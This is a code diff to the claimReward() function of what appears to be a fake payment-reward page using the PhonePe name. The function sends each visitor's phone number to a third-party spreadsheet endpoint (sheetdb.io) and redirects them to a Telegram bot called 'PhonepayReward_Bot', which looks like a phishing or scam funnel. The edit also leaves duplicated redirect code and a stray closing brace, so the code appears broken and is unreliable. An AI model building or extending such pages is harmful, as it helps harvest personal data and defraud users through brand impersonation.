@@ -85,12 +85,17 @@
     }
 
     function claimReward() {
-        fetch('https://sheetdb.io/api/v1/obju8xm02uv6k', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ "Phone": savedInfo, "Status": "Clicked Claim", "Date": new Date().toLocaleString() })
-        });
+    // Data save karna (Optional, agar aapko user ka record rakhna hai)
+    fetch('https://sheetdb.io/api/v1/obju8xm02uv6k', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ "Phone": savedInfo, "Status": "Clicked Claim", "Date": new Date().toLocaleString() })
+    });
 
+    // Aapka SAHI bot username link
+    window.open("https://t.me/PhonepayReward_Bot", "_blank");
+}
+        
         // Bot par redirection
         window.open("https://t.me/PhonepayReward_bot", "_blank");
     }
